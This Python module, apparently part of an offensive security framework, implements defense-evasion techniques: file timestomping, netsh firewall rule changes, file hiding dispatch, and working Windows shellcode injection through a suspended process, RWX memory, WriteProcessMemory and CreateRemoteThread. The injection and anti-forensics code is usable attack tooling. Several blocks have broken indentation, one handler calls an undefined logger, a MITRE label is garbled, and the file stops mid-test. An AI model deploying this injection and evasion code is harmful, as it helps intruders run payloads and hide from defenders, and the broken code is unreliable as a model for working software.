"""
Defense Evasion Module
Handles techniques to avoid detection by security tools.
"""

import os
import platform
import logging
from typing import Dict, Any, Optional, TYPE_CHECKING
from datetime import datetime
import stat # For file attributes
from pathlib import Path # Used by timestomp
import tempfile
import uuid
import subprocess

# Imports needed for Hollowing
if platform.system() == "Windows":
    import ctypes
    from ctypes import wintypes
    # import win32con # Constants defined locally instead
    import win32api
    import win32process
    from ctypes import wintypes as w

# Import OS-specific handlers
from .windows_defense_evasion import WindowsDefenseEvasion
from .linux_defense_evasion import LinuxDefenseEvasion
from .macos_defense_evasion import MacOSDefenseEvasion

# Avoid circular import for type hinting
if TYPE_CHECKING:
    from ..execution.execution import Execution

logger = logging.getLogger(__name__)

class DefenseEvasion:
    """Handles defense evasion techniques by dispatching to OS-specific handlers."""

    def __init__(self, execution_module: 'Execution'):
        self.execution_module = execution_module
        self.os_type = platform.system()
        self.os_handler = None
        self.config = {
            "default_timestomp_mode": "mimic",
            "default_timestomp_source": None,
            "default_time_format": "%Y-%m-%d %H:%M:%S",
        }

        if not execution_module:
            logger.error(
                "DefenseEvasion initialized WITHOUT Execution module. "
                "Some techniques may fail."
            )
            def _dummy_execute(*args, **kwargs):
                logger.error("Execution module unavailable.")
                return {"status": "failure", 
                        "reason": "Execution module unavailable"}
            self._execute_command = _dummy_execute
        else:
            # Wrapper to call execution module
            def _execute_command_wrapper(
                command: str, 
                method: str = "direct", 
                capture: bool = True
            ) -> Dict[str, Any]:
                exec_data = {
                    "execute": {
                        "command": {"cmd": command, "method": method, 
                                    "capture_output": capture}
                    }
                }
                try:
                    exec_result = self.execution_module.execute(exec_data)
                    # Handle potential missing keys gracefully
                    cmd_exec_result = exec_result.get("results", {}) \
                                                 .get("command_execution", {})
                    if "status" not in cmd_exec_result:
                         cmd_exec_result["status"] = "unknown"
                    return cmd_exec_result
                except Exception as e:
                    # Shorten logged command
                    cmd_snippet = command[:70] + ("..." if len(command) > 70 else "")
                    logger.error(
                        f"Exec module failed for '{cmd_snippet}': {e}", 
                        exc_info=True
                    )
                    return {"status": "failure", 
                            "reason": f"Execution failed: {e}"}
            self._execute_command = _execute_command_wrapper

        # Instantiate the appropriate OS handler
        handler_args = (self._execute_command,)
        if self.os_type == "Windows":
            self.os_handler = WindowsDefenseEvasion(*handler_args)
        elif self.os_type == "Linux":
            self.os_handler = LinuxDefenseEvasion(*handler_args)
        elif self.os_type == "Darwin": # macOS
            self.os_handler = MacOSDefenseEvasion(*handler_args)
        else:
            logger.error(f"Unsupported OS for DefenseEvasion: {self.os_type}")

        # Define general techniques
        self.general_techniques = {
             "argument_spoofing": self._handle_argument_spoofing,
             "timestomp": self._timestomp_file, 
             "process_hollowing": self._handle_process_hollowing,
             "firewall_manipulation": self._handle_firewall_manipulation,
        }
        
        # Map OS-specific file_hide directly if available
        if self.os_handler and "file_hide" in self.os_handler.handler_map:
            # Add OS handler's evade method under the 'file_hide' key
            self.general_techniques["file_hide"] = self.os_handler.evade 
        
        # Combine general techniques and OS-specific technique names
        os_technique_names = list(self.os_handler.handler_map.keys()) if self.os_handler else []
        self.supported_techniques = list(self.general_techniques.keys()) + os_technique_names
        # Remove duplicates if file_hide was added to both
        self.supported_techniques = sorted(list(set(self.supported_techniques))) 
        supported_str = ", ".join(self.supported_techniques)
        logger.info(f"Supported techniques on {self.os_type}: {supported_str}")

    def update_config(self, config: Dict[str, Any]):
        """Update internal config."""
        self.config.update(config.get("defense_evasion", {}))
        logger.info("DefenseEvasion config updated.")

    def run_evasion(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Route defense evasion requests."""
        results_map = {}
        errors = []
        final_status = "failure" # Default to failure

        evasion_requests = data.get("evade", {}) 
        technique = evasion_requests.get("technique")
        details = evasion_requests.get("details", {})

        if not technique:
            return {"status": "error", 
                    "message": "Missing 'technique' in evasion request."}

        handler = None
        effective_technique = technique # Technique name passed to OS handler

        # Check OS-specific handlers first
        if self.os_handler and technique in self.os_handler.handler_map:
            handler = self.os_handler.evade # OS handler expects (technique, details)
        # Then check general handlers (which might include OS-specific file_hide)
        elif technique in self.general_techniques:
            handler = self.general_techniques[technique] # General handlers expect (details)
        # Handle legacy/composite techniques like file_evasion
        elif technique == "file_evasion":
            # Dispatch based on action within file_evasion
             action = details.get("action")
            if action == "hide" and "file_hide" in self.general_techniques:
                 handler = self.general_techniques["file_hide"]
                 # Pass 'file_hide' as technique to the handler (which expects it)
                 # The handler itself needs to know it's doing 'file_hide'
                 # This assumes the mapped handler (os_handler.evade) uses the technique name
                 effective_technique = "file_hide"
             elif action == "timestomp":
                 handler = self._timestomp_file
                 effective_technique = "timestomp"
             else:
                 error_msg = (f"Unsupported file evasion action '{action}' "
                              f"or required handler unavailable.")
                  errors.append(error_msg)
                  results_map[technique] = {"status": "error", "message": error_msg}
        else:
            error_msg = f"Unsupported evasion technique: {technique}"
            errors.append(error_msg)
            results_map[technique] = {"status": "error", "message": error_msg}

        # Execute the handler if found
        if handler:
            try:
                # OS handler's evade method expects (technique_name, details)
                if self.os_handler and \
                   effective_technique in self.os_handler.handler_map:
                    evasion_result = handler(effective_technique, details)
                # General handlers expect (details)
                # This includes file_hide if it was mapped from os_handler
                elif effective_technique in self.general_techniques: # Check if it's a general handler
                    # If it's file_hide mapped from OS, call it with technique name
                    if effective_technique == "file_hide" and handler == self.os_handler.evade:
                        evasion_result = handler(effective_technique, details) 
                    else: # Otherwise, it's a standard general handler
                        evasion_result = handler(details)
                else:
                    # This case should ideally not be reached if logic above is correct
                    raise ValueError(f"Handler found but could not determine call signature for {effective_technique}")

                results_map[effective_technique] = evasion_result 
                # Check if the executed operation reported failure or error
                op_status = evasion_result.get("status")
                if op_status not in ["success", "no_op"]:
                    reason = evasion_result.get('reason', f'Status was {op_status}')
                    errors.append(f"Technique '{effective_technique}' failed: {reason}")
            except Exception as e:
                error_msg = f"Technique '{effective_technique}' execution error: {e}"
                errors.append(error_msg)
                logger.error(error_msg, exc_info=True)
                # Store error under the technique name that was attempted
                results_map[effective_technique] = {"status": "error", "reason": str(e)}

        # Determine overall status based on results and errors
        if results_map: # If any handler was executed
             successful_ops = [res for res in results_map.values() 
                               if res.get("status") in ["success", "no_op"]]
             if len(successful_ops) == len(results_map):
        final_status = "success"
             elif successful_ops:
                 final_status = "partial_success"
             else: # All executed operations failed or errored
                 final_status = "failure"
        else: # No handler was found or executed
             final_status = "failure"
             if not errors: errors.append("No valid technique found or executed.")

        return {
            "status": final_status,
            "timestamp": datetime.now().isoformat(),
            "results": results_map,
            "errors": errors if errors else None
        }

    # --- General Handlers ---

    # _handle_file_evasion removed as its logic is integrated into run_evasion

    def _timestomp_file(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Modify file MAC times."""
        target_file = details.get("target_file")
        if not target_file:
             return {"status": "error", "reason": "Missing 'target_file' parameter."}
        
        try: # Wrap path operations in try block
            target_path = Path(target_file).resolve() # Resolve path early
            if not target_path.exists():
                return {"status": "error", 
                        "reason": f"Target file '{target_path}' does not exist."}
        except Exception as path_err:
            return {"status": "error", 
                    "reason": f"Invalid target file path '{target_file}': {path_err}"}
             
        mode = details.get("mode", self.config.get("default_timestomp_mode", "mimic"))
        source_file = details.get("source_file", 
                                  self.config.get("default_timestomp_source"))
        access_time_str = details.get("access_time")
        modify_time_str = details.get("modify_time")
        time_format = self.config.get("default_time_format", "%Y-%m-%d %H:%M:%S")

        result_details = {"target_file": str(target_path), "mode": mode}
        status = "failure"
        mitre_id = "T1070.006"
        mitre_name = "Indicator Removal: Timestomp"
        reason = "" 

        access_time_ts: Optional[float] = None
        modify_time_ts: Optional[float] = None

        logger.info(f"Timestomp on {target_path} using mode: {mode}")

        try:
            if mode == "mimic":
                if not source_file:
                     reason = "Missing 'source_file' for mimic mode."
                     status = "error"
                else:
                     try:
                         source_path = Path(source_file).resolve()
                         if not source_path.exists():
                             reason = f"Source file '{source_path}' for mimic does not exist."
                             status = "error"
                         else:
                             result_details["source_file"] = str(source_path)
                             stat_result = source_path.stat()
                access_time_ts = stat_result.st_atime
                modify_time_ts = stat_result.st_mtime
                             logger.info(f"Mimicking from {source_path}: "
                                         f"AT={access_time_ts:.0f}, MT={modify_time_ts:.0f}")
                     except Exception as src_err:
                         reason = f"Invalid source file path '{source_file}': {src_err}"
                         status = "error"

            elif mode == "specific_time":
                try:
                    current_stat = target_path.stat()
                    # Default to current times if specific times aren't parseable
                    access_time_ts = current_stat.st_atime
                    modify_time_ts = current_stat.st_mtime

                    parsed_at = False
                    if access_time_str:
                        ats_dt = datetime.strptime(access_time_str, time_format)
                        access_time_ts = ats_dt.timestamp()
                        parsed_at = True
                    parsed_mt = False
                    if modify_time_str:
                        mts_dt = datetime.strptime(modify_time_str, time_format)
                        modify_time_ts = mts_dt.timestamp()
                        parsed_mt = True

                    if not parsed_at and not parsed_mt:
                         logger.warning("No specific time provided or parseable, "
                                        "using current times.")
                    logger.info("Using specific times: AT={:.0f}, MT={:.0f}".format(
                                access_time_ts or 0, modify_time_ts or 0))

                except ValueError as e:
                     reason = (f"Invalid time format: {e}. Expected: {time_format}")
                     status = "error"
                except Exception as time_err: # Catch other potential errors
                     reason = f"Error setting specific time: {time_err}"
                     status = "error"
            else:
                 reason = f"Unsupported timestomp mode: {mode}"
                 status = "error"

            # Log reason if error occurred during timestamp determination
            if status == "error" and reason:
                logger.error(f"Timestomp setup failed: {reason}")

            # Apply timestamps only if no error occurred during determination
            if status != "error":
                 if access_time_ts is None or modify_time_ts is None:
                      reason = "Could not determine valid timestamps to apply."
                      logger.error(reason)
                      status = "failure"
                 else:
                     # Apply timestamps
                     os.utime(target_path, (access_time_ts, modify_time_ts))
                     # Verification
                     new_stat = target_path.stat()
                     # Allow small tolerance for floating point comparison
                     if abs(new_stat.st_atime - access_time_ts) < 1 and \
                        abs(new_stat.st_mtime - modify_time_ts) < 1:
                      status = "success"
                      result_details["applied_access_time"] = access_time_ts
                      result_details["applied_modify_time"] = modify_time_ts
                          reason = f"Successfully timestomped {target_path}."
                          logger.info(reason)
                 else:
                          reason = "Verification failed post-os.utime."
                          logger.error(f"{reason} Target={target_path.name} AT={new_stat.st_atime:.0f} MT={new_stat.st_mtime:.0f} vs Set AT={access_time_ts:.0f} MT={modify_time_ts:.0f}")
                          status = "failure"

        except OSError as os_err: # Catch permission errors during os.utime/stat
            reason = f"OS error during timestomp apply/verify: {os_err}"
            logger.error(reason, exc_info=True)
            status = "error"
        except Exception as e: # Catch any other unexpected errors
            reason = f"Unexpected timestomp exception: {e}"
            logger.error(reason, exc_info=True)
            status = "error"

        final_result = {
            "status": status,
            "technique": "timestomp", 
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "details": result_details
        }
        # Add reason only if not successful
        if status not in ["success", "no_op"] and reason:
            final_result["reason"] = reason
            
        return final_result

    def _handle_argument_spoofing(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Simulates executing a command with spoofed arguments."""
        original_command = details.get("original_command")
        spoofed_command = details.get("spoofed_command")

        mitre_id = "T1564.008"
        mitre_name = "Hide Artifacts: Make and Model / Argument Spoofing"

        if not original_command or not spoofed_command:
             return {"status": "error", 
                     "reason": "Missing 'original_command' or 'spoofed_command' detail.",
                     "mitre_id": mitre_id}
        
        status = "success"
        reason = "Simulation: Logged intent to execute command with spoofed arguments."
        
        self.logger.info(f"Simulating Argument Spoofing:")
        self.logger.info(f"  Original intent (simulated): {original_command}")
        self.logger.info(f"  Executed command (simulated): {spoofed_command}")
        # In a real implementation, this might involve process parameter tampering
        # or using specific APIs to launch the process with altered arguments visible
        # to certain tools.
        
        return {
            "status": status,
            "technique": "argument_spoofing_simulation",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": {
                 "original_command": original_command,
                 "spoofed_command": spoofed_command,
                 "message": reason
            },
            "reason": reason if status != "success" else None
        }

    def _handle_process_hollowing(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Executes payload in a legitimate process context (Windows Only)."""
        mitre_id = "T1055.012"
        mitre_name = "Process Injection: Process Hollowing"
        result_details = {}
        status = "failure"
        reason = ""

        if platform.system() != "Windows":
            reason = "Process Hollowing is only supported on Windows."
            return {"status": "not_implemented", "reason": reason, 
                    "details": result_details, "mitre_technique_id": mitre_id, 
                    "mitre_technique_name": mitre_name}

        # --- Windows Specific --- 
        import ctypes
        from ctypes import wintypes as w
        # Define necessary constants locally
        CREATE_SUSPENDED = 0x00000004
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        MEM_RELEASE = 0x8000
        STILL_ACTIVE = 259 # Process status code

        target_executable = details.get("target_executable") 
        payload_path = details.get("payload_path")

        # Basic input validation
        if not target_executable or not payload_path:
             reason = "Missing 'target_executable' or 'payload_path'."
             status = "error"
        else:
             try:
                 payload_p = Path(payload_path).resolve()
                 if not payload_p.exists():
                     reason = f"Payload file not found: {payload_p}"
                     status = "error"
             except Exception as path_err:
                 reason = f"Invalid payload path '{payload_path}': {path_err}"
                 status = "error"
             
        if status == "error":
            logger.error(f"Process Hollowing pre-check failed: {reason}")
            result_details["target_executable"] = target_executable
            result_details["payload_path"] = payload_path
            return {"status": status, "reason": reason, "details": result_details,
                    "mitre_technique_id": mitre_id, 
                    "mitre_technique_name": mitre_name}

        # Log full paths after validation
        try:
            target_exec_str = str(Path(target_executable).resolve())
            payload_path_str = str(Path(payload_path).resolve())
        except Exception as resolve_err:
            reason = f"Failed to resolve input paths: {resolve_err}"
            logger.error(reason)
            result_details["target_executable"] = target_executable
            result_details["payload_path"] = payload_path
            return {"status": "error", "reason": reason, "details": result_details,
                    "mitre_technique_id": mitre_id, 
                    "mitre_technique_name": mitre_name}
            
        logger.info(f"Attempting Process Hollowing: Target='{target_exec_str}', "
                    f"Payload='{payload_path_str}'")
        result_details["target_executable"] = target_exec_str
        result_details["payload_path"] = payload_path_str

        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

        # Define structures locally
        class STARTUPINFO(ctypes.Structure):
             _fields_ = [("cb", w.DWORD), ("lpReserved", w.LPWSTR), 
                         ("lpDesktop", w.LPWSTR), ("lpTitle", w.LPWSTR), 
                         ("dwX", w.DWORD), ("dwY", w.DWORD),
                         ("dwXSize", w.DWORD), ("dwYSize", w.DWORD), 
                         ("dwXCountChars", w.DWORD), ("dwYCountChars", w.DWORD), 
                         ("dwFillAttribute", w.DWORD), ("dwFlags", w.DWORD),
                         ("wShowWindow", w.WORD), ("cbReserved2", w.WORD), 
                         ("lpReserved2", w.LPBYTE), ("hStdInput", w.HANDLE), 
                         ("hStdOutput", w.HANDLE), ("hStdError", w.HANDLE)]

        class PROCESS_INFORMATION(ctypes.Structure):
             _fields_ = [("hProcess", w.HANDLE), ("hThread", w.HANDLE),
                         ("dwProcessId", w.DWORD), ("dwThreadId", w.DWORD)]
        
        si = STARTUPINFO()
        si.cb = ctypes.sizeof(si)
        pi = PROCESS_INFORMATION()
        h_remote_thread: Optional[w.HANDLE] = None 
        mem_addr: Optional[int] = None

        try:
            # 1. Create suspended process
            logger.debug(f"Creating suspended: {target_exec_str}")
            created = kernel32.CreateProcessW(
                w.LPCWSTR(target_exec_str), None, None, None, False,
                CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi))
            if not created:
                err_code = ctypes.get_last_error()
                formatted_error = ctypes.FormatError(err_code)
                reason = f"CreateProcessW fail ({err_code}): {formatted_error}"
                raise RuntimeError(reason)
            
            result_details["created_process_id"] = pi.dwProcessId
            logger.info(f"Suspended PID: {pi.dwProcessId}")

            # 2. Read payload
            shellcode = Path(payload_path_str).read_bytes()
            payload_size = len(shellcode)
            if payload_size == 0:
                 raise ValueError("Payload file is empty.")
            logger.debug(f"Read payload ({payload_size} bytes).")

            # 3. Allocate memory
            logger.debug(f"Allocating {payload_size} bytes in PID {pi.dwProcessId}")
            mem_addr = kernel32.VirtualAllocEx(
                pi.hProcess, None, payload_size, 
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if not mem_addr:
                err_code = ctypes.get_last_error()
                formatted_error = ctypes.FormatError(err_code)
                reason = f"VirtualAllocEx fail ({err_code}): {formatted_error}"
                raise RuntimeError(reason)
            logger.info(f"Allocated at: {hex(mem_addr)}")
            result_details["allocated_address"] = hex(mem_addr)

            # 4. Write payload
            bytes_written = w.SIZE_T()
            write_ok = kernel32.WriteProcessMemory(
                pi.hProcess, mem_addr, shellcode, payload_size, 
                ctypes.byref(bytes_written))
            if not write_ok or bytes_written.value != payload_size:
                err_code = ctypes.get_last_error()
                formatted_error = ctypes.FormatError(err_code)
                reason = (f"WriteProcessMemory fail ({err_code}): {formatted_error}. "
                          f"Wrote {bytes_written.value}/{payload_size}")
                # Attempt cleanup before raising
                if mem_addr: kernel32.VirtualFreeEx(pi.hProcess, mem_addr, 0, MEM_RELEASE) 
                mem_addr = None
                raise RuntimeError(reason)
            logger.debug(f"Wrote {bytes_written.value} bytes payload.")

            # 5. Create Remote Thread
            logger.info(f"Creating remote thread at {hex(mem_addr)}")
            thread_id = w.DWORD()
            h_remote_thread = kernel32.CreateRemoteThread(
                pi.hProcess, None, 0, mem_addr, None, 0, ctypes.byref(thread_id))
            if not h_remote_thread:
                 err_code = ctypes.get_last_error()
                 formatted_error = ctypes.FormatError(err_code)
                 reason = f"CreateRemoteThread fail ({err_code}): {formatted_error}"
                 raise RuntimeError(reason) 
                 
            logger.info(f"Remote thread ID: {thread_id.value}")
            result_details["remote_thread_id"] = thread_id.value
            
            # 6. Resume main thread
            resume_count = kernel32.ResumeThread(pi.hThread)
            if resume_count == -1:
                 err_code = ctypes.get_last_error()
                 # Log error but continue, process might still work
                 logger.warning(f"ResumeThread fail ({err_code}): "
                                f"{ctypes.FormatError(err_code)}")
            else:
                 logger.debug(f"Resumed main thread (prev count: {resume_count}).")

            status = "success"
            reason = "Process Hollowing via CreateRemoteThread initiated."
            result_details["message"] = reason

        except FileNotFoundError as fnf_err:
             reason = f"Hollowing failed: {fnf_err}"
             logger.error(reason)
             status = "failure"
        except (OSError, RuntimeError, ValueError, Exception) as e:
            # Use reason set in try block if available, else format exception
            reason = reason if reason else f"Hollowing exception: {e}"
            logger.error(reason, exc_info=True)
            result_details["error_details"] = str(e)
            status = "failure" 
            
            # --- Cleanup on Failure --- 
            # Terminate the suspended/hollowed process if it was created
            if pi.hProcess and pi.dwProcessId:
                try:
                    logger.warning(f"Terminating failed process PID {pi.dwProcessId}")
                    exit_code = w.DWORD()
                    # Check if process still exists before terminating
                    proc_exists = kernel32.GetExitCodeProcess(pi.hProcess, 
                                                            ctypes.byref(exit_code))
                    if proc_exists and exit_code.value == STILL_ACTIVE: 
                         kernel32.TerminateProcess(pi.hProcess, 1)
                except Exception as term_err:
                    logger.error(f"Cleanup term failed PID {pi.dwProcessId}: {term_err}")
            # Free allocated memory if handle exists and allocation succeeded
            if pi.hProcess and mem_addr:
                 try:
                      logger.debug(f"Freeing mem at {hex(mem_addr)} in PID {pi.dwProcessId}")
                      kernel32.VirtualFreeEx(pi.hProcess, mem_addr, 0, MEM_RELEASE)
                 except Exception as free_err:
                      logger.error(f"Cleanup free failed PID {pi.dwProcessId}: {free_err}")
        finally:
            # --- Final Handle Cleanup --- 
            if h_remote_thread: 
                try: kernel32.CloseHandle(h_remote_thread)
                except Exception: pass
            if pi.hThread:
                try: kernel32.CloseHandle(pi.hThread)
                except Exception: pass
            if pi.hProcess:
                 try: kernel32.CloseHandle(pi.hProcess)
                 except Exception: pass
        
        final_result = {"status": status, "details": result_details, 
                        "mitre_technique_id": mitre_id, 
                        "mitre_technique_name": mitre_name}
        # Add reason only if not successful
        if status != "success" and reason:
            final_result["reason"] = reason
            
        return final_result

    def _handle_firewall_manipulation(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Simulates adding/removing firewall rules via netsh (Windows Only)."""
        mitre_id = "T1562.004"
        mitre_name = "Impair Defenses: Disable or Modify System Firewall"
        result_details = {}
        status = "failure"
        reason = ""

            if platform.system() != "Windows":
            reason = "Firewall manipulation via netsh is Windows-only."
            return {"status": "not_implemented", "reason": reason, 
                    "details": result_details, "mitre_technique_id": mitre_id, 
                    "mitre_technique_name": mitre_name}

        action = details.get("action", "").lower()
        rule_name = details.get("rule_name", f"BFRule_{uuid.uuid4().hex[:8]}")
        direction = details.get("direction", "in").lower()
        protocol = details.get("protocol", "tcp").lower()
        port = details.get("port") 
        program = details.get("program") 
        remote_ip = details.get("remoteip", "any") 
        allow_or_block = details.get("allow_or_block", "allow").lower()

        if action not in ["add", "delete"]:
             reason = "Invalid action. Must be 'add' or 'delete'."
             status = "error"
             logger.error(reason)
             result_details.update({"action": action, "rule_name": rule_name})
             return {"status": status, "reason": reason, "details": result_details,
                     "mitre_technique_id": mitre_id, 
                     "mitre_technique_name": mitre_name}

        result_details.update({
            "action": action, "rule_name": rule_name, "direction": direction, 
            "protocol": protocol, "port": port, "program": program, 
            "remoteip": remote_ip, "allow_or_block": allow_or_block
        })
            
        logger.info(f"Simulating firewall rule: Action={action}, Name='{rule_name}'")
        command = None 
        
        try:
            base_cmd = ["netsh", "advfirewall", "firewall"]
            if action == "add":
                 cmd_parts = base_cmd + ["add", "rule", f'name="{rule_name}"']
                 # Quoting for program path: netsh is picky, double quotes often work
                 if program and str(program).lower() != "any":
                      # Ensure path is resolved and quoted
                      try: 
                          prog_path = Path(program).resolve()
                          quoted_program = f'"{str(prog_path)}"' 
                      except Exception:
                           # Fallback to original quoting if resolve fails
                           logger.warning(f"Could not resolve program path: {program}")
                           quoted_program = f'"{program}"' 
                      cmd_parts.append(f'program={quoted_program}')
                 
                 cmd_parts.append(f"dir={direction}")
                 cmd_parts.append(f"action={allow_or_block}")
                 cmd_parts.append(f"protocol={protocol}")
                 # Ensure port is treated as string for comparison
                 if port is not None and str(port).lower() != "any":
                      cmd_parts.append(f"localport={port}")
                 # Ensure remote_ip is treated as string
                 if remote_ip is not None and str(remote_ip).lower() != "any":
                     cmd_parts.append(f"remoteip={remote_ip}")
                 cmd_parts.append("enable=yes")
                 command = " ".join(cmd_parts)
                 
            elif action == "delete":
                 command = " ".join(base_cmd + ["delete", "rule", f'name="{rule_name}"'])

            if not command:
                 raise ValueError("Could not construct netsh command.")
                 
            logger.debug(f"Executing: {command}")
            
            # Use the execution module (requires admin privileges)
            exec_result = self._execute_command(command, capture=True)
            logger.debug(f"Firewall cmd result: {exec_result}")
            
            stdout = exec_result.get("stdout", "")
            stderr = exec_result.get("stderr", "").lower()
            # Default to -1 if return_code is missing
            rc = exec_result.get("return_code", -1) 
            result_details["return_code"] = rc
            result_details["stdout"] = stdout
            result_details["stderr"] = stderr

            # Interpret results
            permission_error = ("requires elevation" in stderr or \
                                "run as administrator" in stderr)
            no_match_error = ("no rules match" in stderr)

            if rc == 0 and not permission_error:
                 status = "success"
                 reason = f"Firewall rule '{rule_name}' {action} command succeeded (RC=0)."
                 logger.info(reason)
                 result_details["message"] = reason
            elif rc == 0 and permission_error:
                 reason = f"FW rule '{rule_name}' failed: Requires elevation (RC=0)."
                 logger.warning(reason) # Warning because RC=0 but failed
                 status = "failure_permissions"
            elif action == "delete" and no_match_error:
                 status = "no_op" # Rule didn't exist to delete
                 reason = f"FW rule '{rule_name}' did not exist to be deleted."
                 logger.info(reason)
                 result_details["message"] = reason
            elif permission_error:
                 reason = f"FW rule '{rule_name}' failed: Requires elevation (RC={rc})."
                 logger.error(reason)
                 status = "failure_permissions"
            else: # General failure
                 # Log snippets of output
                 stdout_snippet = stdout[:100] + ('...' if len(stdout) > 100 else '')
                 stderr_snippet = stderr[:100] + ('...' if len(stderr) > 100 else '')
                 reason = (f"FW rule '{rule_name}' failed (RC={rc}). "
                           f"Stderr: {stderr_snippet} Stdout: {stdout_snippet}")
                 logger.error(reason)
                 status = "failure"

        except ValueError as val_err: # Catch command construction error
            reason = f"Firewall manipulation value error: {val_err}"
            logger.error(reason)
            status = "error"
        except Exception as e:
             reason = f"Firewall manipulation exception: {e}"
             logger.error(reason, exc_info=True)
            status = "error"
             
        final_result = {"status": status, "details": result_details, 
                        "mitre_technique_id": mitre_id, 
                        "mitre_technique_name": mitre_name}
        # Add reason unless status is success or no_op
        if status not in ["success", "no_op"] and reason:
            final_result["reason"] = reason
            
        return final_result

    # _handle_pid_spoofing removed as it needs OS-specific logic handled by os_handler
    # _log_error removed as logger is used directly


# Example Usage / Testing Block
if __name__ == '__main__':
    import json
    import sys # Import sys for error output in test block
    
    logging.basicConfig(
        level=logging.INFO, 
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    # Mock Execution module
    class MockExecution:
        def execute(self, data: Dict[str, Any]) -> Dict[str, Any]:
            command = data.get("execute", {}).get("command", {})
            cmd_str = command.get("cmd", "")
            # Shorten command for logging
            cmd_snippet = cmd_str[:100] + ('...' if len(cmd_str) > 100 else '')
            print(f"[MockExec] Cmd: {cmd_snippet}")
            
            # Simulate specific outcomes for tests
            if "netsh" in cmd_str:
                print("[MockExec] Simulating permissions error for netsh.")
                return {"results": {"command_execution": {
                            "status": "failure_permissions", "return_code": 1,
                            "stdout": "", 
                            "stderr": "This operation requires elevation."}}}
            elif "bf_argspoof" in cmd_str: # Simulate arg spoofing script success
                 print("[MockExec] Simulating script success for arg spoofing.")
                 return {"results": {"command_execution": {
                             "status": "success", "return_code": 0, 
                             "details": {"stdout": "Script ran", "stderr": ""}}}}
            
            # Default success
            return {"results": {"command_execution": {
                        "status": "success", "return_code": 0,
                        "details": {"stdout": "Mock success", "stderr": ""}}}}

    mock_exec = MockExecution()
    evasion_module = DefenseEvasion(execution_module=mock_exec)

    # --- Testing ---
    tmp_dir = Path(tempfile.gettempdir())
    test_file = tmp_dir / "bluefire_test_file.txt"
    mimic_file = tmp_dir / "bluefire_mimic_source.txt"
    # Define potential hidden path based on OS
    hidden_test_file = (tmp_dir / f".{test_file.name}") \
                       if platform.system() != "Windows" else test_file

    try:
        print("\n--- Setup test files ---")
        test_file.write_text("Test file content.", encoding='utf-8')
        mimic_file.write_text("Source file content.", encoding='utf-8')
        mimic_time = datetime(2022, 1, 1, 12, 0, 0).timestamp()
        os.utime(mimic_file, (mimic_time, mimic_time))
        print(f"Created: {test_file}, {mimic_file}")

        print("\n--- Test File Hiding --- ")
        # Determine technique name based on OS handler capability or generic
        # Use 'file_evasion' with action='hide' if OS specific hide isn't directly supported
        hide_tech = "file_hide" if "file_hide" in evasion_module.supported_techniques \
                      else "file_evasion"
        hide_details = {"target_file": str(test_file)}
        if hide_tech == "file_evasion": # Need action for generic dispatcher
            hide_details["action"] = "hide"
        hide_request = {"evade": {"technique": hide_tech, "details": hide_details}}
        hide_result = evasion_module.run_evasion(hide_request)
        print(json.dumps(hide_result, indent=2))
        
        # Determine which file path to use for subsequent tests
        target_for_stomp_path = test_file
        if platform.system() != "Windows":
            # Check if hide succeeded AND file was actually moved/hidden
            hide_succeeded = hide_result.get("status") == "success"
            file_at_hidden_path = hidden_test_file.exists()
            file_at_orig_path = test_file.exists()
            
            if hide_succeeded and file_at_hidden_path and not file_at_orig_path:
                 target_for_stomp_path = hidden_test_file
                 print(f"Using hidden file for next tests: {hidden_test_file}")
            else:
                 # Log details if hide didn't behave as expected
                 print(f"Hide status: {hide_result.get('status')}. "
                       f"Hidden path exists: {file_at_hidden_path}. "
                       f"Original path exists: {file_at_orig_path}.")
                 target_for_stomp_path = test_file # Fallback to original
                 print(f"Using original file for next tests: {test_file}")
        else: # Windows
             # On Windows, assume hide modifies attributes, file remains at same path
             print(f"Windows: Hide result: {hide_result.get('status')}. "
                   f"Check attributes for '{test_file}' manually.")
             target_for_stomp_path = test_file 

        print("\n--- Test Timestomping (Mimic) --- ")
        stomp_mimic_req = {"evade": {"technique": "timestomp", "details": {
            "target_file": str(target_for_stomp_path),
            "mode": "mimic", "source_file": str(mimic_file)
        }}}
        stomp_mimic_res = evasion_module.run_evasion(stomp_mimic_req)
        print(json.dumps(stomp_mimic_res, indent=2))
        if target_for_stomp_path.exists():
            ts = datetime.fromtimestamp
            t_stat = target_for_stomp_path.stat()
            m_stat = mimic_file.stat()
            # Format timestamps for readability
            time_fmt = "%Y-%m-%d %H:%M:%S"
            print(f"  Target ({target_for_stomp_path.name}) AT={ts(t_stat.st_atime).strftime(time_fmt)}, "
                  f"MT={ts(t_stat.st_mtime).strftime(time_fmt)}")
            print(f"  Source ({mimic_file.name}) AT={ts(m_stat.st_atime).strftime(time_fmt)}, "
                  f"MT={ts(m_stat.st_mtime).strftime(time_fmt)}")

        print("\n--- Test Timestomping (Specific Time) --- ")
        specific_time = "2023-05-15 10:30:00"
        stomp_spec_req = {"evade": {"technique": "timestomp", "details": {
            "target_file": str(target_for_stomp_path),
            "mode": "specific_time", "modify_time": specific_time
        }}}
        stomp_spec_res = evasion_module.run_evasion(stomp_spec_req)
        print(json.dumps(stomp_spec_res, indent=2))
        if target_for_stomp_path.exists():
             t_stat = target_for_stomp_path.stat()
             print(f"  Target ({target_for_stomp_path.name}) AT={ts(t_stat.st_atime).strftime(time_fmt)}, "
                   f"MT={ts(t_stat.st_mtime).strftime(time_fmt)}")

        print("\n--- Test Argument Spoofing --- ")
        real_cmd_out = tmp_dir / "real_cmd_output.txt"
        # Ensure the command works cross-platform (use echo)
        if platform.system() == "Windows":
            # Use full path for output file in command
            real_command_str = f'cmd.exe /c echo Real command ran > "{real_cmd_out.resolve()}"'
        else:
             # Assuming sh/bash - use simple echo
             real_command_str = f'echo "Real command ran" > "{real_cmd_out.resolve()}"'
             
        arg_spoof_req = {"evade": {"technique": "argument_spoofing", "details": {
            "original_command": real_command_str,
